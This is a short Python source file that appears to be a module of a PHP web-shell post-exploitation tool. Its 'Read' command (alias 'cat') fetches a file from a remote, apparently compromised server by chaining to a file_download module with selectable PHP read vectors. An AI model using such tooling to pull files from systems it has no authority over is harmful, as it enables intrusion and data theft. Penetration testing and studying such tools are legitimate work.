from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core import modules
import tempfile

class Read(Module):

    """Read remote file from the remote filesystem."""

    aliases = [ 'cat' ]

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : 'rpath', 'help' : 'Remote file path' },
          { 'name' : '-vector', 'choices' : ( 'file', 'fread', 'file_get_contents', 'base64' ) }
        ])

    def run(self, args):

        # Get a temporary file name
        temp_file = tempfile.NamedTemporaryFile()
        args['lpath'] = temp_file.name

        arg_vector = [ '-vector', args.get('vector') ] if args.get('vector') else []

        # Run file_download
        result = ModuleExec(
                    'file_download',
                    [ args.get('rpath'), '${lpath}' ] + arg_vector,
                    name = 'file_download'
                ).run(args)

        # Delete temp file
        temp_file.close()

        return result
